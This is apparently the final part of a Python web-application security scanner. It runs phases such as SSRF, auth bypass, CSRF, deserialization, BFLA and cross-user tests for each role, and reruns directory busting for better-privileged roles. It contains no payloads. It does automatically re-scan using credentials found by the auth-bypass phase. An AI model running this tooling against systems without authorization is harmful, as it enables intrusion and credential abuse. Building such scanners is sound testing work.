                    pm.set_phase_status(f"business_logic#{_ctx_label}", "error", detail=str(e))

            # ── Phase 6: ssrf ──
            if not _skip("ssrf"):
                pm.set_phase_status(f"ssrf#{_ctx_label}", "running", "SSRF Testing")
                try:
                    _phase_ssrf(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"ssrf#{_ctx_label}", "complete", "SSRF Testing")
                except Exception as e:
                    vc.error(f"Phase ssrf [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"ssrf#{_ctx_label}", "error", detail=str(e))

            # ── Phase 7: auth_bypass ──
            if not _skip("auth_bypass"):
                pm.set_phase_status(f"auth_bypass#{_ctx_label}", "running", "Auth Bypass")
                try:
                    _bypass_found = _phase_auth_bypass(
                        target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"auth_bypass#{_ctx_label}", "complete", "Auth Bypass")
                    for _dc in (_bypass_found or []):
                        _dc_key = (_dc["username"], _dc["password"])
                        if _dc_key not in _discovered_creds_seen:
                            _discovered_creds_seen.add(_dc_key)
                            _dc_lbl = f"discovered_{_dc['username']}"
                            _dc_cfg = copy.deepcopy(cfg)
                            _dc_cfg["auth"]["enabled"]  = True
                            _dc_cfg["auth"]["username"] = _dc["username"]
                            _dc_cfg["auth"]["password"] = _dc["password"]
                            _dc_as  = _build_auth_session(_dc_cfg, "auth",
                                                             no_interactive=True)
                            _cred_contexts.append({"label": _dc_lbl, "cfg": _dc_cfg,
                                                   "auth_sess": _dc_as})
                            vc.log(
                                f"[auth_bypass] Queued re-scan with discovered "
                                f"credentials: {_dc['username']!r}", "INFO")
                except Exception as e:
                    vc.error(f"Phase auth_bypass [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"auth_bypass#{_ctx_label}", "error", detail=str(e))

            # ── Phase 7b: account_lockout ──
            if not _skip("account_lockout"):
                pm.set_phase_status(f"account_lockout#{_ctx_label}", "running", "Account Lockout")
                try:
                    _phase_account_lockout(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"account_lockout#{_ctx_label}", "complete",
                                        "Account Lockout")
                except Exception as e:
                    vc.error(f"Phase account_lockout [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"account_lockout#{_ctx_label}", "error", detail=str(e))

            # ── Phase 8: files ──
            if not _skip("files"):
                pm.set_phase_status(f"files#{_ctx_label}", "running", "Sensitive Files")
                try:
                    _phase_files(target, _ctx_cfg, pm, out, effective_auth)
                    pm.set_phase_status(f"files#{_ctx_label}", "complete", "Sensitive Files")
                except Exception as e:
                    vc.error(f"Phase files [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"files#{_ctx_label}", "error", detail=str(e))

            # ── Phase 10: graphql ──
            if not _skip("graphql"):
                pm.set_phase_status(f"graphql#{_ctx_label}", "running", "GraphQL")
                try:
                    _phase_graphql(target, _ctx_cfg, pm, out, effective_auth)
                    pm.set_phase_status(f"graphql#{_ctx_label}", "complete", "GraphQL")
                except Exception as e:
                    vc.error(f"Phase graphql [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"graphql#{_ctx_label}", "error", detail=str(e))

            # ── Phase 10b: logging_monitoring ──
            if not _skip("logging_monitoring"):
                pm.set_phase_status(f"logging_monitoring#{_ctx_label}", "running",
                                    "Logging & Monitoring")
                try:
                    _phase_logging_monitoring(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"logging_monitoring#{_ctx_label}", "complete",
                                        "Logging & Monitoring")
                except Exception as e:
                    vc.error(f"Phase logging_monitoring [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"logging_monitoring#{_ctx_label}", "error",
                                        detail=str(e))

            # ── Phase 11: auth_recon ──
            if not _skip("auth_recon"):
                if not _ctx_cfg["auth"].get("enabled"):
                    vc.log(f"[auth_recon] auth not enabled for [{_ctx_label}] — skipping",
                           "WARNING")
                    pm.set_phase_status(f"auth_recon#{_ctx_label}", "skipped", "auth_recon")
                else:
                    pm.set_phase_status(f"auth_recon#{_ctx_label}", "running", "Auth Recon")
                    try:
                        auth_recon_data = _phase_auth_recon(
                            target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                        pm.set_phase_status(f"auth_recon#{_ctx_label}", "complete", "Auth Recon")
                        for _k in ("forms", "links", "resource_ids"):
                            _combined_auth_recon[_k].extend(auth_recon_data.get(_k, []))
                    except Exception as e:
                        vc.error(f"Phase auth_recon [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"auth_recon#{_ctx_label}", "error", detail=str(e))

            # ── Phase 13: session ──
            if not _skip("session"):
                if not _ctx_cfg["auth"].get("enabled"):
                    vc.log(f"[session] auth not enabled for [{_ctx_label}] — skipping", "WARNING")
                    pm.set_phase_status(f"session#{_ctx_label}", "skipped", "session")
                else:
                    pm.set_phase_status(f"session#{_ctx_label}", "running", "Session Analysis")
                    try:
                        _phase_session(target, _ctx_cfg, pm, out, effective_auth)
                        pm.set_phase_status(f"session#{_ctx_label}", "complete",
                                            "Session Analysis")
                    except Exception as e:
                        vc.error(f"Phase session [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"session#{_ctx_label}", "error", detail=str(e))

            # ── Phase 14: csrf ──
            if not _skip("csrf"):
                if not _ctx_cfg["auth"].get("enabled"):
                    vc.log(f"[csrf] auth not enabled for [{_ctx_label}] — skipping", "WARNING")
                    pm.set_phase_status(f"csrf#{_ctx_label}", "skipped", "csrf")
                else:
                    pm.set_phase_status(f"csrf#{_ctx_label}", "running", "CSRF Testing")
                    try:
                        _phase_csrf(target, _ctx_cfg, pm, out, effective_auth, auth_recon_data)
                        pm.set_phase_status(f"csrf#{_ctx_label}", "complete", "CSRF Testing")
                    except Exception as e:
                        vc.error(f"Phase csrf [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"csrf#{_ctx_label}", "error", detail=str(e))

            # ── Phase 16: open_redirect ──
            if not _skip("open_redirect"):
                pm.set_phase_status(f"open_redirect#{_ctx_label}", "running", "Open Redirect")
                try:
                    _phase_open_redirect(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"open_redirect#{_ctx_label}", "complete", "Open Redirect")
                except Exception as e:
                    vc.error(f"Phase open_redirect [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"open_redirect#{_ctx_label}", "error", detail=str(e))

            # ── Phase 17: deserialization ──
            if not _skip("deserialization"):
                pm.set_phase_status(f"deserialization#{_ctx_label}", "running", "Deserialization")
                try:
                    _phase_deserialization(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"deserialization#{_ctx_label}", "complete",
                                        "Deserialization")
                except Exception as e:
                    vc.error(f"Phase deserialization [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"deserialization#{_ctx_label}", "error", detail=str(e))

            # ── Phase 18: file_upload_info ──
            if not _skip("file_upload_info"):
                pm.set_phase_status(f"file_upload_info#{_ctx_label}", "running", "File Upload Info")
                try:
                    _phase_file_upload_info(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"file_upload_info#{_ctx_label}", "complete",
                                        "File Upload Info")
                except Exception as e:
                    vc.error(f"Phase file_upload_info [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"file_upload_info#{_ctx_label}", "error", detail=str(e))

            # ── Phase 19: mass_assignment ──
            if not _skip("mass_assignment"):
                pm.set_phase_status(f"mass_assignment#{_ctx_label}", "running", "Mass Assignment")
                try:
                    _phase_mass_assignment(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"mass_assignment#{_ctx_label}", "complete",
                                        "Mass Assignment")
                except Exception as e:
                    vc.error(f"Phase mass_assignment [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"mass_assignment#{_ctx_label}", "error", detail=str(e))

            # ── Phase 21: bfla ──
            if not _skip("bfla"):
                if not _role1_accessible_endpoints:
                    vc.log(f"[bfla] No Role 1 endpoints fingerprinted — skipping [{_ctx_label}]",
                           "INFO")
                    pm.set_phase_status(f"bfla#{_ctx_label}", "skipped", "bfla")
                elif not _is_reduced_ctx:
                    # Role 1 itself — nothing to compare against yet; skip silently.
                    pm.set_phase_status(f"bfla#{_ctx_label}", "skipped", "bfla")
                else:
                    pm.set_phase_status(f"bfla#{_ctx_label}", "running", "BFLA Testing")
                    try:
                        _phase_bfla(target, _ctx_cfg, pm, out,
                                    _role1_accessible_endpoints, _ctx_auth, _ctx_label)
                        pm.set_phase_status(f"bfla#{_ctx_label}", "complete", "BFLA Testing")
                    except Exception as e:
                        vc.error(f"Phase bfla [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"bfla#{_ctx_label}", "error", detail=str(e))

            # Consolidate all finding URLs into structure_map before access matrix sync.
            # Findings from every phase (headers, shcheck, files, etc.) may reference
            # paths that were never written to structure_map incrementally.  Scanning
            # findings_json here ensures every discovered path is tracked.
            try:
                _findings_urls: list = []
                _fj = out.findings_json
                if _fj.exists():
                    for _fentry in json.loads(_fj.read_text()):
                        for _fkey in ("url", "affected"):
                            _fval = _fentry.get(_fkey, "")
                            if _fval and isinstance(_fval, str):
                                _findings_urls.append(_fval)
                if _findings_urls:
                    _write_structure_map(out, target, extra_urls=_findings_urls)
            except Exception:
                pass

            # Sync access_matrix.json with the full structure_map path list before
            # probing so that _probe_role_paths finds an entry for every path
            # (including paths added late in this context after the last incremental
            # write).  _probe_role_paths skips paths with no access matrix entry, so
            # this write must come first.
            try:
                _write_preliminary_access_matrix(out, target, [_ctx_label])
            except Exception:
                pass

            # Probe every structure_map path with this role's session.
            # _write_preliminary_access_matrix above guarantees all paths have an
            # entry; _probe_role_paths fills only the None slots for this role.
            try:
                _probe_role_paths(out, target, _ctx_cfg, _ctx_label, _ctx_auth)
            except Exception:
                pass

            # Store this role's session for retroactive probing by later re-discovery runs.
            if _ctx_label != "unauthenticated":
                _completed_role_sessions[_ctx_label] = _ctx_auth

            # ── Discovery-leader check ────────────────────────────────────────
            # After each authenticated non-reduced context, compare this role's
            # access score against the current discovery leader. If the new role
            # beats the leader by _DISCOVERY_RESCORE_THRESHOLD or has more
            # privileged-path 200s, it becomes the new discovery leader and
            # gobuster/feroxbuster re-run for it. All prior roles are then probed
            # against any newly discovered endpoints.
            # Excluded: unauthenticated, reduced contexts, and the current leader
            # itself (a role cannot outscore itself — the stored leader score is a
            # snapshot from when the role was first elected; later phases inflate
            # the live score, causing a spurious self-outscore comparison).
            if (
                _ctx_label != "unauthenticated"
                and not _is_reduced_ctx
                and _ctx_label != _discovery_leader
                and _n_roles >= 1
            ):
                try:
                    _new_score = _score_role_access(out, target, _ctx_label)
                    _is_first_leader = not _discovery_leader
                    _beats_leader = (
                        _discovery_leader_score["score"] > 0
                        and _new_score["score"] > _discovery_leader_score["score"] * _DISCOVERY_RESCORE_THRESHOLD
                    ) or (
                        _new_score["n200_priv"] > _discovery_leader_score["n200_priv"]
                        and _new_score["n200_priv"] > 0
                    )

                    if _is_first_leader:
                        # First authenticated role always becomes the leader; busting
                        # already ran during its full recon, no re-run needed.
                        _discovery_leader = _ctx_label
                        _discovery_leader_score = _new_score
                        vc.log(
                            f"[discovery-leader] '{_ctx_label}' is initial discovery leader "
                            f"(score={_new_score['score']}, n200={_new_score['n200']}, "
                            f"n200_priv={_new_score['n200_priv']})",
                            "INFO",
                        )
                    elif _beats_leader:
                        vc.log(
                            f"[discovery-leader] '{_ctx_label}' outscores '{_discovery_leader}' "
                            f"(new score={_new_score['score']} vs leader={_discovery_leader_score['score']}, "
                            f"n200_priv {_new_score['n200_priv']} vs {_discovery_leader_score['n200_priv']}). "
                            "Re-running gobuster/feroxbuster for new leader.",
                            "INFO",
                        )
                        # Re-run busting as the new leader's session
                        _prev_ep_base = set(_ep_base)
                        try:
                            _new_buster_urls = _run_buster_only(
                                target, _ctx_cfg, out, effective_auth,
                                wc_baseline=wc_baseline,
                                role_label=_ctx_label,
                            )
                        except Exception as _be:
                            vc.error(f"[discovery-leader] _run_buster_only error: {_be}")
                            _new_buster_urls = []

                        # Identify newly discovered URLs not seen by prior busting
                        _newly_found = [
                            u for u in _new_buster_urls
                            if u.rstrip("/") not in _prev_ep_base
                            and u.rstrip("/") != target["url"].rstrip("/")
                        ]
                        if _newly_found:
                            vc.log(
                                f"[discovery-leader] {len(_newly_found)} new URL(s) found by "
                                f"'{_ctx_label}' busting — retroactively probing all prior roles.",
                                "INFO",
                            )
                            # Merge new URLs into _ep_base for subsequent phases
                            for _nu in _newly_found:
                                _nup = _nu.rstrip("/")
                                if _nup not in _prev_ep_base:
                                    _ep_base.append(_nup)
                            # Retroactively probe all completed prior roles
                            try:
                                _retroactive_probe(
                                    out, target, _ctx_cfg,
                                    _newly_found,
                                    _completed_role_sessions,
                                )
                            except Exception as _rpe:
                                vc.error(f"[discovery-leader] _retroactive_probe error: {_rpe}")
                            # Probe the new leader itself for the new URLs
                            try:
                                _probe_role_paths(out, target, _ctx_cfg, _ctx_label, _ctx_auth)
                            except Exception:
                                pass
                        else:
                            vc.log(
                                f"[discovery-leader] No new URLs found by '{_ctx_label}' "
                                "busting beyond prior discovery.",
                                "INFO",
                            )

                        _discovery_leader = _ctx_label
                        _discovery_leader_score = _new_score
                except Exception as _dse:
                    vc.error(f"[discovery-leader] Scoring error: {_dse}")

            # ── Multi-role: prompt for the next role's credentials ───────────
            # Only triggered after a multi_role authenticated context whose
            # successor has not yet been collected (first target only; subsequent
            # targets reuse _collected_roles populated here).
            if (
                _ctx.get("multi_role")
                and _ctx_label != "unauthenticated"
            ):
                _next_idx = _ctx.get("role_idx", 0) + 1
                if _next_idx < _n_roles and _next_idx >= len(_collected_roles):
                    # Collect credentials for the next role now
                    _nr_creds = _prompt_next_role_creds(_next_idx + 1, _n_roles)
                    _collected_roles.append(_nr_creds)
                    if _nr_creds["role"] not in _all_roles_ctx:
                        _all_roles_ctx.insert(-1, _nr_creds["role"])  # before "unauthenticated"
                    _nr_cfg = copy.deepcopy(cfg)
                    _nr_cfg["auth"]["enabled"]  = True
                    _nr_cfg["auth"]["username"] = _nr_creds["username"]
                    _nr_cfg["auth"]["password"] = _nr_creds["password"]
                    _nr_as = _build_auth_session(_nr_cfg, "auth", _scope_hostnames)
                    if _nr_as:
                        _attach_redirect_hook(_nr_as, _scope_hostnames, target,
                                              out, _in_scope_new)
                    # Insert before the unauthenticated context (always last)
                    _cred_contexts.insert(-1, {
                        "label":      _nr_creds["role"],
                        "cfg":        _nr_cfg,
                        "auth_sess":  _nr_as,
                        "reduced":    True,
                        "multi_role": True,
                        "role_idx":   _next_idx,
                    })

        # ── Post-context: privilege-escalation / cross-credential phases ───
        _scan_ctx["role"] = ""  # context loop complete; clear role tracker
        out._output_role  = ""  # post-context phases write to unroled paths
        if auth_sess and cfg.get("auth", {}).get("enabled"):
            _post_user = cfg.get("auth", {}).get("username", "").strip() or "authenticated"
            out.set_auth_context([{"username": _post_user, "role": "authenticated"}])
        else:
            out.set_auth_context([{"username": "UNAUTH", "role": "unauthenticated"}])

        def _skip(phase_name: str) -> bool:
            if not phases_enabled.get(phase_name, False):
                vc.log(f"[{phase_name}] Phase disabled — skipping", "INFO")
                return True
            if pm.is_phase_complete(phase_name):
                vc.log(f"[{phase_name}] Already complete — skipping (checkpoint)", "INFO")
                return True
            return False

        effective_auth = auth_sess or sess

        # ── Phase 12: authorization ──
        if not _skip("authorization"):
            if not cfg["auth"].get("enabled"):
                vc.log("[authorization] auth not enabled — skipping", "WARNING")
                pm.set_phase_status("authorization", "skipped", "authorization")
            else:
                pm.set_phase_status("authorization", "running", "Authorization")
                try:
                    _phase_authorization(target, cfg, pm, out, effective_auth,
                                         _combined_auth_recon)
                    pm.set_phase_status("authorization", "complete", "Authorization")
                except Exception as e:
                    vc.error(f"Phase authorization error: {e}")
                    pm.set_phase_status("authorization", "error", detail=str(e))

        # ── Phase 15: cross_user ──
        if not _skip("cross_user"):
            if not cfg["auth"].get("enabled") or not cfg["auth2"].get("enabled"):
                vc.log("[cross_user] auth and/or auth2 not enabled — skipping", "WARNING")
                pm.set_phase_status("cross_user", "skipped", "cross_user")
            elif not auth2_sess:
                vc.log("[cross_user] auth2 session could not be established — skipping",
                       "WARNING")
                pm.set_phase_status("cross_user", "skipped", "cross_user")
            else:
                pm.set_phase_status("cross_user", "running", "Cross-User Testing")
                try:
                    _phase_cross_user(target, cfg, pm, out, effective_auth,
                                      auth2_sess, _combined_auth_recon)
                    pm.set_phase_status("cross_user", "complete", "Cross-User Testing")
                except Exception as e:
                    vc.error(f"Phase cross_user error: {e}")
                    pm.set_phase_status("cross_user", "error", detail=str(e))

        # ── Phase 20: access_matrix ──
        # Deduplicate crawl links accumulated across all contexts
        _seen_lnk: set = set()
        _dedup_links = [l for l in _all_crawl_links
                        if l not in _seen_lnk and not _seen_lnk.add(l)]
        if not _skip("access_matrix"):
            pm.set_phase_status("access_matrix", "running", "Access Matrix")
            try:
                # In multi-role mode _collected_roles is the authoritative role list;
                # overwrite auth_matrix in cfg so _phase_access_matrix uses correct labels.
                if _n_roles >= 1 and _collected_roles:
                    cfg["auth_matrix"] = [
                        {"role": r["role"], "username": r["username"], "password": r["password"]}
                        for r in _collected_roles
                    ]
                # Pass sessions already established in the context loop to avoid
                # re-authenticating every role a second time.
                _am_prebuilt = {
                    _c["label"]: _c["auth_sess"]
                    for _c in _cred_contexts
                    if _c["label"] != "unauthenticated" and _c["auth_sess"] is not None
                }
                _phase_access_matrix(target, cfg, pm, out, sess, {"links": _dedup_links},
                                     prebuilt_sessions=_am_prebuilt or None)
                pm.set_phase_status("access_matrix", "complete", "Access Matrix")
            except Exception as e:
                vc.error(f"Phase access_matrix error: {e}")
                pm.set_phase_status("access_matrix", "error", detail=str(e))

        # Write summary
        try:
            findings = json.loads(out.findings_json.read_text(encoding="utf-8"))
        except Exception:
            findings = []

        out.write_summary({
            "target": target["url"],
            "project": str(project_dir),
            "phases_run": [k for k, v in phases_enabled.items() if v],
            "checkpoint": pm.get_state(),
        })

        vc.log(f"Scan complete. Findings: {len(findings)}", "SUCCESS")
        vc.log(f"Output: {project_dir}", "INFO")

        # Queue any in-scope redirect-discovered URLs for full scanning
        for _new_url in _in_scope_new:
            _norm_new = _new_url.rstrip("/")
            if _norm_new not in _processed_urls and _norm_new not in _pending_urls:
                _pending_urls.append(_norm_new)
                _redirect_discovered.add(_norm_new)
                vc.log(
                    f"[redirect] Queued in-scope redirect target for scanning: {_norm_new}",
                    "INFO",
                )

        if not vc.managed:
            _tprint(f"\n{Fore.GREEN}[+] Scan complete!{Style.RESET_ALL}")
            _tprint(f"    Findings  : {len(findings)}")
            _tprint(f"    Output    : {project_dir}")
            _tprint(f"    JSON      : {out.findings_json}")
            _tprint(f"    CSV       : {out.findings_csv}")
            risk_counts: dict = {}
            for f in findings:
                r = (f.get("risk") or "INFO").upper()
                risk_counts[r] = risk_counts.get(r, 0) + 1
            for r in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
                if risk_counts.get(r, 0):
                    colour = {
                        "CRITICAL": Fore.RED, "HIGH": Fore.RED,
                        "MEDIUM": Fore.YELLOW, "LOW": Fore.CYAN, "INFO": Fore.WHITE,
                    }.get(r, "")
                    _tprint(f"    {colour}{r:<10}{Style.RESET_ALL}: {risk_counts[r]}")
            _tprint()


if __name__ == "__main__":
    main()
